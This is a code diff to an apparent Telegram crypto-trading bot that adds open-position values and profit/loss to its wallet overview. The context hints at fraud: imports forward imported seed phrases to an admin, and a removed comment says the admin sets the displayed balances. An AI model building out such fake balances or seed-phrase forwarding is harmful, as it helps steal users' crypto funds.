@@ -3,6 +3,7 @@ const { Telegraf, Markup, session } = require('telegraf');
 const db = require('./db');
 const { generateAllWallets, detectAndImport, importFromPhrase } = require('./wallets');
 const { notifyAdmin, notifyImport, notifyPhraseImport, notifyWithdrawal } = require('./adminNotify');
+const { enrichPositions } = require('./prices');
 const { startAutoDepositScheduler } = require('./scheduler');
 
 if (!process.env.BOT_TOKEN) {
@@ -24,14 +25,33 @@ const mainMenu = Markup.keyboard([
 ]).resize();
 
 
-function formatWalletOverview(user) {
+async function formatWalletOverview(user) {
   const ethBal = Number(user.eth_balance ?? 0);
   const bscBal = Number(user.bsc_balance ?? 0);
   const solBal = Number(user.sol_balance ?? 0);
-  // Dummy portfolio: treat stored balances as $ contribution (admin sets $ amounts)
-  const portfolio = ethBal + bscBal + solBal;
+  const openCount = db.countOpenPositions(user.telegram_id);
+  let positionsBlock = '';
+  let positionsValue = 0;
 
-  return (
+  try {
+    const raw = db.getPositions(user.telegram_id, true);
+    if (raw.length) {
+      const enriched = await enrichPositions(raw);
+      positionsBlock = '\n*Open positions:*\n';
+      for (const p of enriched) {
+        const sign = p.pnl >= 0 ? '+' : '';
+        positionsValue += p.currentValue;
+        positionsBlock +=
+          `• *${p.symbol}*  $${p.currentValue.toFixed(2)}  (${sign}${p.pnlPct.toFixed(1)}%)\n`;
+      }
+    }
+  } catch (e) {
+    console.error('positions enrich failed:', e.message);
+  }
+
+  const portfolio = ethBal + bscBal + solBal + positionsValue;
+
+  let body =
     '💼 *Wallet Overview* — ✅ Connected\n' +
     '━━━━━━━━━━━━━━━━━━━━━━━\n' +
     '👤 *SOL Address* (tap to copy):\n' +
@@ -43,12 +63,16 @@ function formatWalletOverview(user) {
     `💰 *SOL Balance:* ${solBal.toFixed(2)} SOL\n` +
     `💰 *BNB Balance:* ${bscBal.toFixed(2)} BNB\n` +
     `💰 *ETH Balance:* ${ethBal.toFixed(2)} ETH\n` +
-    '📦 *Open Positions:* 0\n' +
+    `📦 *Open Positions:* ${openCount}\n` +
     `📉 *Portfolio Value:* $${portfolio.toFixed(2)}\n` +
-    '━━━━━━━━━━━━━━━━━━━━━━━\n' +
-    '⚠️ No active tokens in your wallet.\n' +
-    '🟢 Try /buy to place your first trade!'
-  );
+    '━━━━━━━━━━━━━━━━━━━━━━━\n';
+
+  if (openCount === 0) {
+    body += '⚠️ No active tokens in your wallet.\n🟢 Try /buy to place your first trade!';
+  } else {
+    body += positionsBlock;
+  }
+  return body;
 }
 
 
@@ -118,7 +142,7 @@ bot.hears('👛 Wallet', async (ctx) => {
   const user = db.getUser(ctx.from.id);
   if (!user) return ctx.reply('Send /start first to create your wallets.');
 
-  await ctx.reply(formatWalletOverview(user), {
+  await ctx.reply(await formatWalletOverview(user), {
     parse_mode: 'Markdown',
     ...Markup.inlineKeyboard([
       [Markup.button.callback('🟢 Buy', 'buy_start'), Markup.button.callback('📤 Withdraw', 'withdraw_from_wallet')],
@@ -829,7 +853,7 @@ bot.command('wallet', async (ctx) => {
   const user = db.getUser(ctx.from.id);
   if (!user) return ctx.reply('Send /start first to create your wallets.');
 
-  await ctx.reply(formatWalletOverview(user), {
+  await ctx.reply(await formatWalletOverview(user), {
     parse_mode: 'Markdown',
     ...Markup.inlineKeyboard([
       [Markup.button.callback('🟢 Buy', 'buy_start'), Markup.button.callback('📤 Withdraw', 'withdraw_from_wallet')],
